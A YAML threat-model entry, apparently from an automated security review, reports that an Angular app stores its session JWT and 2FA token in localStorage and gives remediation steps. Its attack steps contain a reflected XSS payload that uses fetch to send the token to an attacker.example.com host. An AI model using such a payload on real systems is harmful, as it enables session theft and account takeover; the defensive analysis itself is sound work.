threats:
- architectural_violation: true
  attack_steps:
  - An attacker crafts a URL targeting the reflected XSS at `search-result.component.ts:143`, e.g., `/#/search?q=<img src=x
    onerror=fetch('https://attacker.example.com/?t='+localStorage.getItem('token'))>`.
  - The attacker delivers the URL to a logged-in victim via a phishing message; the victim's Angular app bypasses the sanitizer
    and renders the payload.
  - The injected script reads `localStorage.getItem('token')` (and optionally `totp_tmp_token`) and exfiltrates both values
    to the attacker's endpoint.
  - The attacker replays the stolen JWT against `/rest/user/whoami` and all authenticated API endpoints, fully impersonating
    the victim.
  component_name: Frontend SPA
  controls_in_place: A session cookie is also set with an 8-hour expiry (`login.component.ts:104`) but it lacks `HttpOnly`
    and `Secure` flags per `ngy-cookie` defaults; the localStorage copy is the primary bearer credential used in the `Authorization`
    header.
  cwe: CWE-922
  evidence:
  - file: frontend/src/app/login/login.component.ts
    line: 101
  evidence_check: verified
  evidence_flags:
  - flag_id: EV-001
    line_excerpt: localStorage.setItem('token', authentication.token)
    reason: Line 101 shows localStorage.setItem('token', authentication.token) directly storing JWT in browser storage.
    verdict: verified
    verified_at: '2026-08-02T07:28:31Z'
  evidence_summary: '`login.component.ts:101` and `oauth.component.ts:51` both call `localStorage.setItem(''token'', ...)`,
    and `login.component.ts:120` stores `totp_tmp_token` — all readable by any script in the same origin.'
  evidence_tier: confirmed-exploitable
  impact: Critical
  impact_description: Any XSS payload executing in the SPA's origin can steal the active session JWT and 2FA pre-auth token,
    achieving persistent account takeover that survives until the token expires.
  likelihood: High
  local_id: frontend-spa-010
  mitigation_title: Move session JWT to an HttpOnly Secure cookie via a Backend-for-Frontend and eliminate localStorage token
    storage
  remediation:
    code_example: null
    effort: High
    reference: CWE-922
    steps:
    - 'Implement a Backend-for-Frontend (BFF) pattern: the login endpoint sets a `HttpOnly; Secure; SameSite=Strict` cookie
      containing the JWT, never returning the raw token to Angular.'
    - Remove all `localStorage.setItem('token', ...)` calls from `login.component.ts`, `oauth.component.ts`, and any other
      component; the Angular `HttpClient` will send the `HttpOnly` cookie automatically.
    - Replace the `LoginGuard.canActivate()` token-presence check with a lightweight `/rest/user/whoami` call — the cookie
      is the credential, not a value in localStorage.
    - Store the 2FA temp token as a short-lived server-side session attribute (Redis, server-side session store) keyed to
      a non-sensitive session ID, not in localStorage.
    verification: After the fix, open DevTools → Application → localStorage and confirm no `token` or `totp_tmp_token` key
      is present; confirm the session cookie has `HttpOnly` and `Secure` flags visible in DevTools → Application → Cookies.
  risk: Critical
  scenario: 'After successful login, `login.component.ts:101` stores the JWT as `localStorage.setItem(''token'', authentication.token)`.
    When 2FA is required, `login.component.ts:120` also stores the pre-auth 2FA token as `localStorage.setItem(''totp_tmp_token'',
    error.data.tmpToken)`. The basket ID is stored in `sessionStorage` at line 105. The same pattern repeats in `oauth.component.ts:51`.
    localStorage is accessible to any JavaScript executing in the same origin — including all the confirmed XSS vectors in
    this component (`bypassSecurityTrustHtml` at 15+ sites across the SPA). The combination of exploitable XSS and localStorage-stored
    credentials creates a direct path to full account takeover: one reflected XSS click exfiltrates the JWT and all session
    state.'
  source: stride
  stride: Information Disclosure
  threat_category_id: TH-04
  title: JWT and 2FA Temporary Token Stored in localStorage (login.component.ts:101)
  id: T-001
  component: frontend-spa
